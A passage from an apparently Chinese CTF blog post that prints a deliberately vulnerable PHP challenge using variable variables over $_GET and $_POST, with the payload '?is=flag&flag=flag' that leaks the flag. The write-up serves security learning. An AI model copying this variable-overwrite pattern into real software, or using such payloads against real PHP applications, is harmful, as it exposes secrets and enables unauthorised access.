</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;flag.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$yds</span> <span class=o>=</span> <span class=s2>&#34;dog&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$is</span> <span class=o>=</span> <span class=s2>&#34;cat&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$handsome</span> <span class=o>=</span> <span class=s1>&#39;yds&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_POST</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$$x</span> <span class=o>=</span> <span class=nv>$y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_GET</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$$x</span> <span class=o>=</span> <span class=nv>$$y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_GET</span> <span class=k>as</span> <span class=nv>$x</span> <span class=o>=&gt;</span> <span class=nv>$y</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nv>$x</span> <span class=o>&amp;&amp;</span> <span class=nv>$x</span> <span class=o>!==</span> <span class=s1>&#39;flag&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=nv>$handsome</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=nv>$yds</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;flag&#39;</span>  <span class=o>||</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;flag&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=nv>$is</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;the flag is: &#34;</span><span class=o>.</span><span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?is=flag&amp;flag=flag
</span></span></code></pre></td></tr></table></div></div><p>尝试 1. 直接从 echo 输出 2. 从 yds 输出 都不行，被几个 if 条件限制住了，只能从 is 输出。</p><hr></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>PHP</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 BU44ER's BLOG</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>